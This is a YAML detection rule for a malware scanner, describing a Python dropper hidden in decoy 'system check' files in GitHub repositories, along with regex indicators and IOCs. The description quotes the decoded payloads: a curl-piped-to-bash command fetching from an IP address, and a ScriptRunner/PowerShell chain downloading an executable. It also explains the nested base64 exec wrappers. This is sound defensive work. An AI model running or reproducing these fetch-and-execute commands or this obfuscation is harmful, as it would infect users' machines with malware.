file_patterns: ["*.py"]

first_seen: 2026-10-20
contributor: carterperez-dev
description: >
  Secondary Python dropper family found co-located with the known Hermes stage-1
  loader inside shared carrier repositories (first observed in
  tokmakova-nadyubya/sora2-watermark-remover-enchanted/utils/system_checks.py).
  Not Hermes, not PyMapper. The outer file is a decoy "system check" utility
  whose real behavior is hidden behind two nested wrappers:
    - top-level: inline `exec(' ... base64.b64decode ...')` of a string that
      concatenates two b64 blobs and execs the result
    - inner: `_initialize_system_hooks()` which does a DOUBLE
      `b64decode(b64decode(blob))` on a different variable and execs that
  After decoding, both wrappers reach the same payload:
    - darwin -> `subprocess.Popen('/bin/bash -c "$(curl -fsSL
      http://217.156.122.146/Peravi)"', shell=True)`
    - win32 -> `ScriptRunner.exe -appvscript powershell.exe ... Invoke-WebRequest
      https://py-installer.com/api/f -OutFile tempfile13.exe` (T1218.011 LOLBin)
  Static indicators below target the OUTER file as it ships on GitHub (what the
  regex engine actually sees), plus bonus pins on the decoded payload for
  files where the dropper is stored in cleartext.

references:
  - "First observed carrier: tokmakova-nadyubya/sora2-watermark-remover-enchanted/utils/system_checks.py (2026-10-20)"
  - "Co-located with Hermes stage-1 in the same repo (unrelated families, shared carrier)"
  - "macOS stage-2 host: 217.156.122.146/Peravi"
  - "Windows stage-2 host: py-installer.com/api/f -> tempfile13.exe"
  - "MITRE ATT&CK: T1059.006 Python, T1140 Deobfuscate/Decode, T1218.011 ScriptRunner LOLBin, T1059.001 PowerShell, T1105 Ingress Tool Transfer"

indicators:
  - name: aliased_double_b64_decode
    weight: 35
    type: regex
    pattern: '[A-Za-z_][A-Za-z0-9_]*\.b64decode\s*\(\s*[A-Za-z_][A-Za-z0-9_]*\.b64decode\s*\('

  - name: exec_compile_single_char_marker
    weight: 30
    type: regex
    pattern: 'exec\s*\(\s*compile\s*\([^,]+,\s*"<[a-z]>"\s*,\s*"exec"\s*\)\s*\)'

  - name: exec_of_inline_base64_import
    weight: 30
    type: regex
    pattern: "exec\\s*\\(\\s*'import\\s+base64\\s+as\\s+_"

  - name: large_base64_string_literal
    weight: 20
    type: regex
    pattern: '"[A-Za-z0-9+/=]{1000,}"'

  - name: decoy_scaffold_names
    weight: 15
    type: regex
    pattern: '_validate_system_integrity|_check_runtime_environment|_verify_dependencies|_finalize_initialization|_initialize_system_hooks|_perform_checksum_validation|_validate_runtime_configuration|_check_system_compatibility|_generate_runtime_tokens'

  - name: silent_nested_try_exec
    weight: 10
    type: regex
    pattern: 'try:\s*\n[^\n]*\n\s*try:\s*\n[^\n]*exec\s*\('

  - name: scriptrunner_powershell_chain
    weight: 35
    type: regex
    pattern: 'ScriptRunner\.exe\s+-appvscript\s+powershell\.exe'

  - name: curl_pipe_bash_subprocess
    weight: 30
    type: regex
    pattern: 'subprocess\.Popen\s*\(\s*[''"]/bin/bash\s+-c\s+"\$\(curl\s+-fsSL'

  - name: popen_shell_create_no_window
    weight: 15
    type: regex
    pattern: 'subprocess\.Popen\s*\([^)]{0,400}creationflags\s*=\s*subprocess\.CREATE_NO_WINDOW'

  - name: ord_shift_caesar_decoder
    weight: 20
    type: regex
    pattern: 'chr\s*\(\s*ord\s*\(\s*[A-Za-z_][A-Za-z0-9_]*\s*\)\s*-\s*\d{1,3}\s*\)'

  - name: chrcode_array_permutation_decoder
    weight: 20
    type: regex
    pattern: 'chr\s*\(\s*[A-Za-z_][A-Za-z0-9_]*\[\s*[A-Za-z_][A-Za-z0-9_]*\s*\]\s*\)\s+for\s+[A-Za-z_][A-Za-z0-9_]*\s+in\s+[A-Za-z_][A-Za-z0-9_]*'

  - name: ioc_mac_stage2_ip
    weight: 25
    type: literal
    pattern: '217.156.122.146'

  - name: ioc_win_stage2_host
    weight: 25
    type: literal
    pattern: 'py-installer.com'

  - name: ioc_mac_endpoint_peravi
    weight: 15
    type: literal
    pattern: '/Peravi'

  - name: ioc_win_payload_filename
    weight: 15
    type: literal
    pattern: 'tempfile13.exe'

